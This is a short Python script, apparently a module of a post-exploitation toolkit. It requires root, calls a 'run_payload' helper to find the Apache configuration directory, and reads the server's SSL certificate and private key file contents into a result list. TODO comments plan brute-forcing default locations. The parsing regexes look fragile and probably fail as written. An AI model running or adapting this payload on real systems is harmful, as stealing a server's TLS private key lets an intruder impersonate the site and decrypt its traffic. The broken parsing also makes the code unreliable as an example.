#REQUIRE_LINUX
#REQUIRE ROOT

import re

result = []

def parse_config (apache_config):
    config = re.findall('^(?!\t#)(.*?)$', apache_config, re.MULTILINE)
    if config:
        return config
    else:
        return ''

def parse_ssl_cert (apache_config):
    cert = re.search('(?<=SSLCertificateFile    )(.*?)\'', apache_config)
    if cert:
        return cert.group(1)
    else:
        return ''

def parse_ssl_key (apache_config):
    key = re.search('(?<=SSLCertificateKeyFile )(.*?)\'', apache_config)
    if key:
        return key.group(1)
    else:
        return ''

#TODO:CALLS APACHE_CONFIG_DIRECTORY
#TODO:CALLS APACHE_CONFIG
#TODO:BRUTEFORCE DEFAULT KNOWN LOCATIONS
apache_dir = run_payload('apache_config_directory')
apache_config = parse_config(read(apache_dir+'sites-available/default-ssl'))
result.append(read(parse_ssl_cert(str(apache_config))))
result.append(read(parse_ssl_key(str(apache_config))))
